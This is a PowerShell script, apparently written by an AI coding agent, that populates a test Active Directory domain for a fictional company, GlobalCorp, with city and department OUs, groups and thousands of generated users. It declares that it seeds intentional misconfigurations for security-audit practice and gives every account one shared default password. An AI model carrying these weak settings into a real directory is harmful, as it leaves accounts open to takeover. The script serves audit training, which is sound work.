<#
.SYNOPSIS
    AD population script for GlobalCorp multinational company simulation
    Includes intentional vulnerabilities for security audits

.DESCRIPTION
    Creates a complete AD structure with :
    - 20 world metropolises (OUs par continent/ville/departement)
    - Users proportional to city populations
    - 16 departments with complete hierarchy
    - Security and distribution groups
    - ~10% misconfigurations for audits

.PARAMETER TotalUsers
    Total number of users to create (minimum 100)

.PARAMETER DefaultPassword
    Default password for users

.PARAMETER OutputPath
    Path for CSV and HTML reports

.EXAMPLE
    .\Populate-AD-GlobalCorp.ps1 -TotalUsers 7500 -DefaultPassword "Welcome2024!"

.NOTES
    Author: Claude Code (Anthropic)
    Version: 1.0
    Target domain: aza-me.cc
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [ValidateRange(100, 50000)]
    [int]$TotalUsers,

    [Parameter(Mandatory=$false)]
    [string]$DefaultPassword,

    [Parameter(Mandatory=$false)]
    [string]$OutputPath = "C:\ADPopulate_Reports",

    [Parameter(Mandatory=$false)]
    [switch]$Confirm,

    [Parameter(Mandatory=$false)]
    [switch]$NoOpenReport,

    [Parameter(Mandatory=$false)]
    [switch]$SkipUserCreation,

    [Parameter(Mandatory=$false)]
    [switch]$OnlyVulnerabilities,

    [Parameter(Mandatory=$false)]
    [ValidateRange(1, 100)]
    [int]$VulnPercent = 10,

    [Parameter(Mandatory=$false)]
    [ValidateRange(0, 100)]
    [int]$UltraVulnUsers = 0,

    [Parameter(Mandatory=$false)]
    [ValidateRange(5, 50)]
    [int]$UltraVulnMin = 10,

    [Parameter(Mandatory=$false)]
    [ValidateRange(10, 60)]
    [int]$UltraVulnMax = 30,

    [Parameter(Mandatory=$false)]
    [ValidateRange(1, 100)]
    [int]$VulnUserCount = 0,

    [Parameter(Mandatory=$false)]
    [ValidateRange(0, 5000)]
    [int]$TotalComputers = 0,

    [Parameter(Mandatory=$false)]
    [ValidateRange(1, 100)]
    [int]$VulnComputerPercent = 10
)

#Requires -Modules ActiveDirectory

# ============================================================================
# GLOBAL CONFIGURATION
# ============================================================================

$script:Config = @{
    CompanyName = "GlobalCorp"
    Domain = "aza-me.cc"
    DomainDN = "DC=aza-me,DC=cc"
    RootOU = "GlobalCorp"
    VulnerabilityPercentage = 10
    StartTime = Get-Date
    CreatedUsers = @()
    CreatedGroups = @()
    CreatedOUs = @()
    Vulnerabilities = @()
    Errors = @()
}

# ============================================================================
# WORLD METROPOLISES DATA (Top 20 by population)
# ============================================================================

$script:Cities = @(
    [PSCustomObject]@{ Name = "Tokyo";         Country = "JP"; CountryName = "Japan";       Continent = "Asia";          Population = 37.4; Phone = "+81";  PostalFormat = "XXX-XXXX"; Address = "1-1 Marunouchi, Chiyoda-ku" }
    [PSCustomObject]@{ Name = "Delhi";         Country = "IN"; CountryName = "India";       Continent = "Asia";          Population = 32.9; Phone = "+91";  PostalFormat = "XXXXXX";   Address = "Connaught Place" }
    [PSCustomObject]@{ Name = "Shanghai";      Country = "CN"; CountryName = "China";       Continent = "Asia";          Population = 29.2; Phone = "+86";  PostalFormat = "XXXXXX";   Address = "501 Yincheng Middle Road, Pudong" }
    [PSCustomObject]@{ Name = "Sao-Paulo";     Country = "BR"; CountryName = "Brazil";      Continent = "South-America";  Population = 22.4; Phone = "+55";  PostalFormat = "XXXXX-XXX"; Address = "Av. Paulista, 1000" }
    [PSCustomObject]@{ Name = "Mexico-City";   Country = "MX"; CountryName = "Mexico";      Continent = "North-America"; Population = 21.9; Phone = "+52";  PostalFormat = "XXXXX";    Address = "Paseo de la Reforma 250" }
    [PSCustomObject]@{ Name = "Cairo";         Country = "EG"; CountryName = "Egypt";       Continent = "Africa";       Population = 21.3; Phone = "+20";  PostalFormat = "XXXXX";    Address = "26 July Street, Downtown" }
    [PSCustomObject]@{ Name = "Mumbai";        Country = "IN"; CountryName = "India";       Continent = "Asia";          Population = 21.0; Phone = "+91";  PostalFormat = "XXXXXX";   Address = "Nariman Point" }
    [PSCustomObject]@{ Name = "Beijing";       Country = "CN"; CountryName = "China";       Continent = "Asia";          Population = 20.9; Phone = "+86";  PostalFormat = "XXXXXX";   Address = "1 Chang'an Avenue, Dongcheng" }
    [PSCustomObject]@{ Name = "Dhaka";         Country = "BD"; CountryName = "Bangladesh";  Continent = "Asia";          Population = 18.6; Phone = "+880"; PostalFormat = "XXXX";     Address = "Motijheel Commercial Area" }
    [PSCustomObject]@{ Name = "Osaka";         Country = "JP"; CountryName = "Japan";       Continent = "Asia";          Population = 19.1; Phone = "+81";  PostalFormat = "XXX-XXXX"; Address = "2-1 Umeda, Kita-ku" }
    [PSCustomObject]@{ Name = "New-York";      Country = "US"; CountryName = "USA";         Continent = "North-America"; Population = 18.8; Phone = "+1";   PostalFormat = "XXXXX";    Address = "350 Fifth Avenue, Manhattan" }
    [PSCustomObject]@{ Name = "Karachi";       Country = "PK"; CountryName = "Pakistan";    Continent = "Asia";          Population = 16.8; Phone = "+92";  PostalFormat = "XXXXX";    Address = "I.I. Chundrigar Road" }
    [PSCustomObject]@{ Name = "Buenos-Aires";  Country = "AR"; CountryName = "Argentina";   Continent = "South-America";  Population = 15.5; Phone = "+54";  PostalFormat = "XXXX";     Address = "Av. 9 de Julio 1000" }
    [PSCustomObject]@{ Name = "Istanbul";      Country = "TR"; CountryName = "Turkey";      Continent = "Europe";        Population = 15.4; Phone = "+90";  PostalFormat = "XXXXX";    Address = "Levent, Buyukdere Caddesi" }
    [PSCustomObject]@{ Name = "Kolkata";       Country = "IN"; CountryName = "India";       Continent = "Asia";          Population = 15.1; Phone = "+91";  PostalFormat = "XXXXXX";   Address = "BBD Bagh" }
    [PSCustomObject]@{ Name = "Lagos";         Country = "NG"; CountryName = "Nigeria";     Continent = "Africa";       Population = 14.9; Phone = "+234"; PostalFormat = "XXXXXX";   Address = "Victoria Island" }
    [PSCustomObject]@{ Name = "Manila";        Country = "PH"; CountryName = "Philippines"; Continent = "Asia";          Population = 14.4; Phone = "+63";  PostalFormat = "XXXX";     Address = "Ayala Avenue, Makati" }
    [PSCustomObject]@{ Name = "Guangzhou";     Country = "CN"; CountryName = "China";       Continent = "Asia";          Population = 13.8; Phone = "+86";  PostalFormat = "XXXXXX";   Address = "Tianhe District" }
    [PSCustomObject]@{ Name = "Rio-de-Janeiro";Country = "BR"; CountryName = "Brazil";      Continent = "South-America";  Population = 13.6; Phone = "+55";  PostalFormat = "XXXXX-XXX"; Address = "Av. Rio Branco, Centro" }
    [PSCustomObject]@{ Name = "Los-Angeles";   Country = "US"; CountryName = "USA";         Continent = "North-America"; Population = 12.5; Phone = "+1";   PostalFormat = "XXXXX";    Address = "633 West 5th Street" }
)

# ============================================================================
# DEPARTMENTS AND ROLES
# ============================================================================

$script:Departments = @(
    [PSCustomObject]@{ Name = "IT";          Percentage = 12; Roles = @("Developer", "System Administrator", "Database Administrator", "Cloud Architect", "DevOps Engineer", "IT Support Analyst", "Network Engineer", "Security Engineer") }
    [PSCustomObject]@{ Name = "HR";          Percentage = 6;  Roles = @("HR Specialist", "Recruiter", "Benefits Administrator", "HR Coordinator", "Training Specialist", "Compensation Analyst") }
    [PSCustomObject]@{ Name = "Finance";     Percentage = 8;  Roles = @("Financial Analyst", "Accountant", "Controller", "Internal Auditor", "Tax Specialist", "Treaony Analyst", "Accounts Payable Specialist") }
    [PSCustomObject]@{ Name = "Marketing";   Percentage = 7;  Roles = @("Marketing Specialist", "Content Creator", "SEO Specialist", "Brand Manager", "Digital Marketing Manager", "Marketing Analyst") }
    [PSCustomObject]@{ Name = "Sales";       Percentage = 15; Roles = @("Sales Representative", "Account Manager", "Sales Engineer", "Business Development Manager", "Regional Sales Manager", "Inside Sales Rep") }
    [PSCustomObject]@{ Name = "Operations";  Percentage = 10; Roles = @("Operations Analyst", "Project Coordinator", "Business Analyst", "Process Improvement Specialist", "Operations Manager") }
    [PSCustomObject]@{ Name = "Legal";       Percentage = 4;  Roles = @("Corporate Lawyer", "Paralegal", "Contract Specialist", "Legal Counsel", "Compliance Attorney") }
    [PSCustomObject]@{ Name = "RnD";         Percentage = 10; Roles = @("Research Scientist", "R&D Engineer", "Product Developer", "Innovation Specialist", "Lab Technician") }
    [PSCustomObject]@{ Name = "Support";     Percentage = 8;  Roles = @("Customer Support Representative", "Technical Support Engineer", "Help Desk Analyst", "Support Team Lead") }
    [PSCustomObject]@{ Name = "Logistics";   Percentage = 5;  Roles = @("Supply Chain Analyst", "Warehouse Manager", "Shipping Coordinator", "Inventory Specialist", "Logistics Planner") }
    [PSCustomObject]@{ Name = "Executive";   Percentage = 2;  Roles = @("Chief Executive Officer", "Chief Financial Officer", "Chief Technology Officer", "Chief Operating Officer", "Vice President", "Director") }
    [PSCustomObject]@{ Name = "Compliance";  Percentage = 3;  Roles = @("Compliance Analyst", "Risk Manager", "Compliance Officer", "Ethics Coordinator", "Regulatory Specialist") }
    [PSCustomObject]@{ Name = "Security";    Percentage = 4;  Roles = @("Security Analyst", "Security Engineer", "SOC Analyst", "Penetration Tester", "Security Architect") }
    [PSCustomObject]@{ Name = "Facilities";  Percentage = 3;  Roles = @("Facilities Manager", "Maintenance Technician", "Office Administrator", "Building Coordinator") }
    [PSCustomObject]@{ Name = "PR";          Percentage = 2;  Roles = @("PR Specialist", "Communications Manager", "Media Relations Coordinator", "Corporate Communications Specialist") }
    [PSCustomObject]@{ Name = "Training";    Percentage = 1;  Roles = @("Training Specialist", "Learning Development Manager", "Instructional Designer", "Corporate Trainer") }
)

# ============================================================================
# BASE DE DONNeES DE NOMS INTERNATIONAUX
# ============================================================================

$script:FirstNames = @{
    # Asia
    Japanese = @("Hiroshi", "Takeshi", "Kenji", "Yuki", "Sakura", "Haruki", "Akira", "Naomi", "Ren", "Hana", "Daiki", "Yuto", "Sota", "Mei", "Aoi", "Riku", "Kaito", "Sora", "Mio", "Yuna")
    Chinese = @("Wei", "Fang", "Ming", "Li", "Xiu", "Chen", "Yan", "Hong", "Jing", "Lin", "Hui", "Xiao", "Yu", "Ying", "Lan", "Ping", "Qiang", "Lei", "Jun", "Tao")
    Indian = @("Raj", "Priya", "Amit", "Sunita", "Vikram", "Anita", "Sanjay", "Deepa", "Rahul", "Kavita", "Arjun", "Neha", "Rohan", "Pooja", "Aditya", "Shreya", "Kiran", "Meera", "Vivek", "Anjali")
    Filipino = @("Jose", "Maria", "Juan", "Ana", "Pedro", "Rosa", "Miguel", "Carmen", "Antonio", "Elena", "Rafael", "Isabella", "Gabriel", "Sofia", "Luis", "Daniela", "Carlos", "Lucia", "Diego", "Valentina")
    Pakistani = @("Ahmed", "Fatima", "Ali", "Ayesha", "Hassan", "Zara", "Omar", "Sana", "Imran", "Hira", "Bilal", "Amina", "Usman", "Maryam", "Kamran", "Nadia", "Faisal", "Saima", "Tariq", "Rabia")
    Bangladeshi = @("Rahim", "Nasreen", "Karim", "Sultana", "Habib", "Ruma", "Jamal", "Fatema", "Rafiq", "Shapla", "Salim", "Hasina", "Anwar", "Taslima", "Masud", "Rehana", "Zahir", "Parveen", "Shahid", "Momtaz")

    # Europe & Middle East
    Turkish = @("Mehmet", "Ayse", "Mustafa", "Fatma", "Ahmet", "Emine", "Ali", "Hatice", "Huseyin", "Zeynep", "Hasan", "Elif", "Ibrahim", "Merve", "Ismail", "Esra", "Osman", "Ozlem", "Yusuf", "Busra")
    Arabic = @("Mohamed", "Fatima", "Ahmed", "Aisha", "Mahmoud", "Maryam", "Hassan", "Sara", "Hussein", "Layla", "Omar", "Nour", "Ali", "Hana", "Khalid", "Dina", "Youssef", "Rania", "Karim", "Amira")

    # Ameriques
    Hispanic = @("Carlos", "Maria", "Juan", "Ana", "Luis", "Carmen", "Jose", "Rosa", "Miguel", "Elena", "Pedro", "Sofia", "Diego", "Isabella", "Alejandro", "Valentina", "Fernando", "Lucia", "Ricardo", "Gabriela")
    Portuguese = @("Joao", "Maria", "Pedro", "Ana", "Paulo", "Fernanda", "Lucas", "Julia", "Gabriel", "Beatriz", "Rafael", "Mariana", "Bruno", "Carolina", "Thiago", "Amanda", "Leonardo", "Larissa", "Mateus", "Camila")
    Anglo = @("James", "Emma", "Michael", "Olivia", "William", "Ava", "John", "Sophia", "David", "Isabella", "Robert", "Mia", "Daniel", "Charlotte", "Matthew", "Amelia", "Andrew", "Harper", "Christopher", "Evelyn")

    # Africa
    Nigerian = @("Chukwu", "Adaeze", "Emeka", "Ngozi", "Obinna", "Chioma", "Ikenna", "Amaka", "Chidi", "Nneka", "Uche", "Oluchi", "Nnamdi", "Adanna", "Kelechi", "Ifeoma", "Onyeka", "Ebele", "Tochukwu", "Chiamaka")
}

$script:LastNames = @{
    Japanese = @("Tanaka", "Suzuki", "Yamamoto", "Watanabe", "Ito", "Nakamura", "Kobayashi", "Kato", "Yoshida", "Yamada", "Sasaki", "Yamaguchi", "Matsumoto", "Inoue", "Kimura", "Hayashi", "Shimizu", "Yamazaki", "Mori", "Abe")
    Chinese = @("Wang", "Li", "Zhang", "Liu", "Chen", "Yang", "Huang", "Zhao", "Wu", "Zhou", "Xu", "Sun", "Ma", "Zhu", "Hu", "Guo", "He", "Lin", "Luo", "Gao")
    Indian = @("Sharma", "Patel", "Singh", "Kumar", "Gupta", "Reddy", "Iyer", "Nair", "Mehta", "Joshi", "Verma", "Rao", "Desai", "Shah", "Malhotra", "Kapoor", "Bhat", "Menon", "Pillai", "Banerjee")
    Filipino = @("Santos", "Reyes", "Cruz", "Garcia", "Mendoza", "Torres", "Flores", "Gonzales", "Bautista", "Villanueva", "Fernandez", "Lopez", "Martinez", "Rodriguez", "Perez", "Ramos", "Castillo", "Rivera", "Aquino", "Dela Cruz")
    Pakistani = @("Khan", "Ahmed", "Ali", "Malik", "Hussain", "Shah", "Mirza", "Qureshi", "Siddiqui", "Butt", "Iqbal", "Javed", "Raza", "Chaudhry", "Sheikh", "Aslam", "Rehman", "Farooq", "Anwar", "Saleem")
    Bangladeshi = @("Rahman", "Islam", "Hossain", "Ahmed", "Begum", "Khan", "Akter", "Chowdhury", "Miah", "Uddin", "Sultana", "Khatun", "Sarker", "Bibi", "Talukdar", "Sheikh", "Siddique", "Haque", "Alam", "Bhuiyan")
    Turkish = @("Yilmaz", "Kaya", "Demir", "Celik", "Sahin", "Yildiz", "Yildirim", "Ozturk", "Aydin", "Ozdemir", "Arslan", "Dogan", "Kilic", "Aslan", "Cetin", "Kara", "Koc", "Kurt", "Ozkan", "Simsek")
    Arabic = @("Al-Farsi", "Al-Rashid", "Al-Mahmoud", "Al-Hassan", "Al-Ibrahim", "Al-Abdullah", "Al-Khalil", "Al-Nasser", "Al-Salem", "Al-Qasim", "El-Sayed", "El-Masri", "El-Amin", "El-Sharif", "El-Hadi")
    Hispanic = @("Garcia", "Rodriguez", "Martinez", "Lopez", "Gonzalez", "Hernandez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Gomez", "Diaz", "Morales", "Reyes", "Cruz", "Ortiz", "Gutierrez", "Chavez")
    Portuguese = @("Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro", "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes", "Vieira", "Barbosa")
    Anglo = @("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris", "Clark")
    Nigerian = @("Okonkwo", "Adeyemi", "Okafor", "Nwosu", "Eze", "Okoro", "Nwachukwu", "Uzoma", "Chukwu", "Ogbonna", "Emeka", "Onyekachi", "Nnamdi", "Obiora", "Chibueze", "Azubuike", "Ikechukwu", "Ugochukwu", "Chinedu", "Ebube")
}

# Mapping ville -> culture de noms (with melange international)
$script:CityNameCulture = @{
    "Tokyo" = @("Japanese", "Anglo", "Chinese")
    "Delhi" = @("Indian", "Anglo", "Arabic")
    "Shanghai" = @("Chinese", "Anglo", "Japanese")
    "Sao-Paulo" = @("Portuguese", "Hispanic", "Anglo")
    "Mexico-City" = @("Hispanic", "Anglo", "Portuguese")
    "Cairo" = @("Arabic", "Anglo", "Turkish")
    "Mumbai" = @("Indian", "Anglo", "Arabic")
    "Beijing" = @("Chinese", "Anglo", "Japanese")
    "Dhaka" = @("Bangladeshi", "Indian", "Anglo")
    "Osaka" = @("Japanese", "Anglo", "Chinese")
    "New-York" = @("Anglo", "Hispanic", "Chinese", "Indian")
    "Karachi" = @("Pakistani", "Arabic", "Anglo")
    "Buenos-Aires" = @("Hispanic", "Portuguese", "Anglo")
    "Istanbul" = @("Turkish", "Arabic", "Anglo")
    "Kolkata" = @("Indian", "Anglo", "Bangladeshi")
    "Lagos" = @("Nigerian", "Anglo", "Arabic")
    "Manila" = @("Filipino", "Hispanic", "Anglo")
    "Guangzhou" = @("Chinese", "Anglo", "Japanese")
    "Rio-de-Janeiro" = @("Portuguese", "Hispanic", "Anglo")
    "Los-Angeles" = @("Anglo", "Hispanic", "Chinese", "Filipino")
}

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "SuccessS", "WARNING", "ERROR")]
        [string]$Level = "INFO"
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "INFO"    { "Cyan" }
        "SuccessS" { "Green" }
        "WARNING" { "Yellow" }
        "ERROR"   { "Red" }
    }

    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $color
}

function Get-RandomName {
    param(
        [string]$City
    )

    $cultures = $script:CityNameCulture[$City]
    if (-not $cultures) { $cultures = @("Anglo") }

    $culture = $cultures | Get-Random

    $firstName = $script:FirstNames[$culture] | Get-Random
    $lastName = $script:LastNames[$culture] | Get-Random

    # 20% chance de melanger les cultures for plus de diversite
    if ((Get-Random -minimum 1 -Maximum 100) -le 20) {
        $otherCulture = $cultures | Get-Random
        $lastName = $script:LastNames[$otherCulture] | Get-Random
    }

    return @{
        FirstName = $firstName
        LastName = $lastName
    }
}

function Get-SafeSamAccountName {
    param(
        [string]$LastName,
        [string]$FirstName
    )

    # Nettoyer les caracteres speciaux
    $cleanLast = $LastName -replace "[^a-zA-Z]", ""
    $cleanFirst = $FirstName -replace "[^a-zA-Z]", ""

    $baseSam = "$($cleanLast.ToLower()).$($cleanFirst.ToLower())"

    # Tronquer si necessaire (max 20 caracteres for SAM)
    if ($baseSam.Length -gt 20) {
        $baseSam = $baseSam.Substring(0, 20)
    }

    return $baseSam
}

function Get-UniqueSamAccountName {
    param(
        [string]$BaseSam
    )

    $sam = $BaseSam
    $counter = 1

    while ($true) {
        try {
            $existing = Get-ADUser -Identity $sam -ErrorAction SilentlyContinue
            if ($existing) {
                $counter++
                $sam = "$BaseSam$counter"
                if ($sam.Length -gt 20) {
                    $sam = $BaseSam.Substring(0, 20 - $counter.ToString().Length) + $counter
                }
            } else {
                break
            }
        } catch {
            break
        }
    }

    return $sam
}

function Get-RandomPhoneNumber {
    param(
        [string]$Prefix
    )

    $number = ""
    for ($i = 0; $i -lt 9; $i++) {
        $number += Get-Random -minimum 0 -Maximum 10
    }

    return "$Prefix $($number.Substring(0,3))-$($number.Substring(3,3))-$($number.Substring(6,3))"
}

function Get-RandomPostalCode {
    param(
        [string]$Format
    )

    $result = ""
    foreach ($char in $Format.ToCharArray()) {
        if ($char -eq 'X') {
            $result += Get-Random -minimum 0 -Maximum 10
        } else {
            $result += $char
        }
    }
    return $result
}

function Get-RandomEmployeeID {
    return "GC-" + (Get-Random -minimum 10000 -Maximum 99999)
}

# ============================================================================
# FONCTIONS DE CReATION AD
# ============================================================================

function New-ADOUIfNotExists {
    param(
        [string]$Name,
        [string]$Path,
        [string]$Description = ""
    )

    $ouDN = "OU=$Name,$Path"

    try {
        $existing = Get-ADOrganizationalUnit -Identity $ouDN -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Log "OU existe deja: $ouDN" "INFO"
            return $ouDN
        }
    } catch {
        # OU n'existe pas, on continue
    }

    try {
        New-ADOrganizationalUnit -Name $Name -Path $Path -Description $Description -ProtectedFromAccidentalDeletion $false
        Write-Log "OU creee: $ouDN" "SuccessS"
        $script:Config.CreatedOUs += $ouDN
        return $ouDN
    } catch {
        Write-Log "Error creation OU $ouDN : $_" "ERROR"
        $script:Config.Errors += "OU: $ouDN - $_"
        return $null
    }
}

function New-ADGroupIfNotExists {
    param(
        [string]$Name,
        [string]$Path,
        [string]$Description = "",
        [ValidateSet("Security", "Distribution")]
        [string]$GroupCategory = "Security",
        [ValidateSet("Global", "Universal", "DomainLocal")]
        [string]$GroupScope = "Global"
    )

    try {
        $existing = Get-ADGroup -Filter "Name -eq '$Name'" -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Log "group existe deja: $Name" "INFO"
            return $existing.DistinguishedName
        }
    } catch {
        # group n'existe pas
    }

    try {
        $group = New-ADGroup -Name $Name -Path $Path -Description $Description `
            -GroupCategory $GroupCategory -GroupScope $GroupScope -PassThru
        Write-Log "group cree: $Name" "SuccessS"
        $script:Config.CreatedGroups += @{
            Name = $Name
            DN = $group.DistinguishedName
            Category = $GroupCategory
            Scope = $GroupScope
        }
        return $group.DistinguishedName
    } catch {
        Write-Log "Error creation group $Name : $_" "ERROR"
        $script:Config.Errors += "Group: $Name - $_"
        return $null
    }
}

# ============================================================================
# Creating OU structure
# ============================================================================

function New-GlobalCorpOUStructure {
    Write-Log "=== Creating OU structure ===" "INFO"

    # OU Racine
    $rootOU = New-ADOUIfNotExists -Name $script:Config.RootOU -Path $script:Config.DomainDN -Description "GlobalCorp International Corporation"

    if (-not $rootOU) {
        Write-Log "Impossible de creer l'OU racine, arret." "ERROR"
        return $false
    }

    # Continents
    $continents = $script:Cities | Select-Object -ExpandProperty Continent -Unique

    foreach ($continent in $continents) {
        $continentOU = New-ADOUIfNotExists -Name $continent -Path $rootOU -Description "Region $continent"

        if ($continentOU) {
            # Villes in ce continent
            $citiesInContinent = $script:Cities | Where-Object { $_.Continent -eq $continent }

            foreach ($city in $citiesInContinent) {
                $cityOU = New-ADOUIfNotExists -Name $city.Name -Path $continentOU -Description "Bureau $($city.Name), $($city.Country)"

                if ($cityOU) {
                    # Departements in chaque ville
                    foreach ($dept in $script:Departments) {
                        New-ADOUIfNotExists -Name $dept.Name -Path $cityOU -Description "Departement $($dept.Name) - $($city.Name)" | Out-Null
                    }
                }
            }
        }
    }

    # OU speciales for les comptes sensibles
    New-ADOUIfNotExists -Name "Service-Accounts" -Path $rootOU -Description "Comptes de service" | Out-Null
    New-ADOUIfNotExists -Name "Privileged-Accounts" -Path $rootOU -Description "Comptes privilegies" | Out-Null
    New-ADOUIfNotExists -Name "Disabled-Accounts" -Path $rootOU -Description "Comptes desactives" | Out-Null

    Write-Log "Structure OU creee with Success" "SuccessS"
    return $true
}

# ============================================================================
# CreatingS groups
# ============================================================================

function New-GlobalCorpGroups {
    Write-Log "=== Creatings groups ===" "INFO"

    $rootOU = "OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

    # Creer une OU for les groups
    $groupsOU = New-ADOUIfNotExists -Name "Groups" -Path $rootOU -Description "groups GlobalCorp"

    if (-not $groupsOU) {
        Write-Log "Impossible de creer l'OU Groups" "ERROR"
        return $false
    }

    # groups par departement
    Write-Log "Creatings groups par departement..." "INFO"
    foreach ($dept in $script:Departments) {
        New-ADGroupIfNotExists -Name "GS-$($dept.Name)" -Path $groupsOU -Description "group securite - Departement $($dept.Name)" -GroupCategory Security | Out-Null
        New-ADGroupIfNotExists -Name "DL-$($dept.Name)-All" -Path $groupsOU -Description "Liste distribution - Tous $($dept.Name)" -GroupCategory Distribution | Out-Null
    }

    # groups par ville
    Write-Log "Creatings groups par ville..." "INFO"
    foreach ($city in $script:Cities) {
        New-ADGroupIfNotExists -Name "GS-$($city.Name)" -Path $groupsOU -Description "group securite - Bureau $($city.Name)" -GroupCategory Security | Out-Null
        New-ADGroupIfNotExists -Name "DL-$($city.Name)-All" -Path $groupsOU -Description "Liste distribution - Tous $($city.Name)" -GroupCategory Distribution | Out-Null
    }

    # groups par role hierarchique
    Write-Log "Creatings groups par role..." "INFO"
    $roleGroups = @(
        @{ Name = "GS-Executives"; Desc = "Cadres dirigeants (C-Level)" }
        @{ Name = "GS-Directors"; Desc = "Directors" }
        @{ Name = "GS-Managers"; Desc = "Managers" }
        @{ Name = "GS-TeamLeads"; Desc = "Team Leads" }
        @{ Name = "GS-Employees"; Desc = "Employes" }
        @{ Name = "GS-Contractors"; Desc = "Contractuels" }
        @{ Name = "GS-Interns"; Desc = "Stagiaires" }
    )

    foreach ($rg in $roleGroups) {
        New-ADGroupIfNotExists -Name $rg.Name -Path $groupsOU -Description $rg.Desc -GroupCategory Security | Out-Null
    }

    # groups projets fictifs
    Write-Log "Creatings groups projets..." "INFO"
    $projects = @("Alpha", "Beta", "Gamma", "Delta", "Epsilon", "Phoenix", "Titan", "Nova", "Apex", "Zenith")
    foreach ($project in $projects) {
        New-ADGroupIfNotExists -Name "GS-Project-$project" -Path $groupsOU -Description "equipe projet $project" -GroupCategory Security | Out-Null
    }

    # groups globaux
    New-ADGroupIfNotExists -Name "DL-AllStaff" -Path $groupsOU -Description "Tous les employes GlobalCorp" -GroupCategory Distribution -GroupScope Universal | Out-Null
    New-ADGroupIfNotExists -Name "GS-RemoteWorkers" -Path $groupsOU -Description "Employes en teletravail" -GroupCategory Security | Out-Null
    New-ADGroupIfNotExists -Name "GS-VPN-Users" -Path $groupsOU -Description "users VPN" -GroupCategory Security | Out-Null

    Write-Log "groups crees with Success" "SuccessS"
    return $true
}

# ============================================================================
# CALCUL DE LA DISTRIBUTION DES users
# ============================================================================

function Get-UserDistribution {
    param(
        [int]$TotalUsers
    )

    Write-Log "Calcul de la distribution des users..." "INFO"

    $totalPopulation = ($script:Cities | Measure-Object -Property Population -Sum).Sum
    $distribution = @()
    $allocatedUsers = 0

    for ($i = 0; $i -lt $script:Cities.Count; $i++) {
        $city = $script:Cities[$i]
        $percentage = $city.Population / $totalPopulation

        if ($i -eq $script:Cities.Count - 1) {
            # Derniere ville: prendre le reste for eviter les Errors d'arrondi
            $userCount = $TotalUsers - $allocatedUsers
        } else {
            $userCount = [math]::Round($TotalUsers * $percentage)
        }

        $allocatedUsers += $userCount

        $distribution += [PSCustomObject]@{
            City = $city
            UserCount = $userCount
            Percentage = [math]::Round($percentage * 100, 2)
        }

        Write-Log "  $($city.Name): $userCount users ($([math]::Round($percentage * 100, 1))%)" "INFO"
    }

    return $distribution
}

# ============================================================================
# CreatingS users
# ============================================================================

function New-GlobalCorpUsers {
    param(
        [array]$Distribution,
        [securestring]$SecurePassword,
        [string]$PlainPassword
    )

    Write-Log "=== Creatings users ===" "INFO"

    $totalUsers = ($Distribution | Measure-Object -Property UserCount -Sum).Sum
    $createdCount = 0
    $globalEmployeeCounter = 1

    # Tracking for la hierarchie
    $script:CityManagers = @{}
    $script:DeptManagers = @{}
    $script:TeamLeads = @{}
    $script:AllUsers = @()

    foreach ($cityDist in $Distribution) {
        $city = $cityDist.City
        $userCount = $cityDist.UserCount

        Write-Log "Creating $userCount users for $($city.Name)..." "INFO"

        # Calculer les users par departement for cette ville
        $deptDistribution = @()
        $allocatedDeptUsers = 0

        for ($d = 0; $d -lt $script:Departments.Count; $d++) {
            $dept = $script:Departments[$d]

            if ($d -eq $script:Departments.Count - 1) {
                $deptUserCount = $userCount - $allocatedDeptUsers
            } else {
                $deptUserCount = [math]::Round($userCount * ($dept.Percentage / 100))
            }

            $allocatedDeptUsers += $deptUserCount
            $deptDistribution += [PSCustomObject]@{
                Department = $dept
                UserCount = $deptUserCount
            }
        }

        # Creer les users par departement
        foreach ($deptDist in $deptDistribution) {
            $dept = $deptDist.Department
            $deptUserCount = $deptDist.UserCount

            if ($deptUserCount -eq 0) { continue }

            $ouPath = "OU=$($dept.Name),OU=$($city.Name),OU=$($city.Continent),OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

            for ($u = 0; $u -lt $deptUserCount; $u++) {
                $name = Get-RandomName -City $city.Name
                $baseSam = Get-SafeSamAccountName -LastName $name.LastName -FirstName $name.FirstName
                $sam = Get-UniqueSamAccountName -BaseSam $baseSam
                $upn = "$sam@$($script:Config.Domain)"
                $displayName = "$($name.FirstName) $($name.LastName)"
                $employeeID = "GC-" + $globalEmployeeCounter.ToString().PadLeft(5, '0')
                $globalEmployeeCounter++

                # DeCompletedr le role
                $role = $dept.Roles | Get-Random

                # DeCompletedr le type d'employe
                $employeeTypeRand = Get-Random -minimum 1 -Maximum 100
                $employeeType = if ($employeeTypeRand -le 85) { "Full-Time" }
                               elseif ($employeeTypeRand -le 95) { "Contractor" }
                               else { "Intern" }

                # DeCompletedr le niveau hierarchique
                $isManager = $false
                $isDirector = $false
                $isTeamLead = $false
                $isExecutive = $dept.Name -eq "Executive"

                # Premier user de chaque dept/ville = manager
                if ($u -eq 0 -and $deptUserCount -ge 3) {
                    $isManager = $true
                    $role = "$($dept.Name) Manager"
                }
                # Deuxieme = team lead si assez d'users
                elseif ($u -eq 1 -and $deptUserCount -ge 10) {
                    $isTeamLead = $true
                    $role = "$($dept.Name) Team Lead"
                }
                # Team leads additionnels tous les 10 employes
                elseif ($u -gt 1 -and $u % 10 -eq 0 -and $deptUserCount -gt $u + 5) {
                    $isTeamLead = $true
                    $role = "$($dept.Name) Team Lead"
                }

                $userParams = @{
                    Name = $displayName
                    GivenName = $name.FirstName
                    Surname = $name.LastName
                    SamAccountName = $sam
                    UserPrincipalName = $upn
                    DisplayName = $displayName
                    Path = $ouPath
                    AccountPassword = $SecurePassword
                    Enabled = $true
                    Title = $role
                    Department = $dept.Name
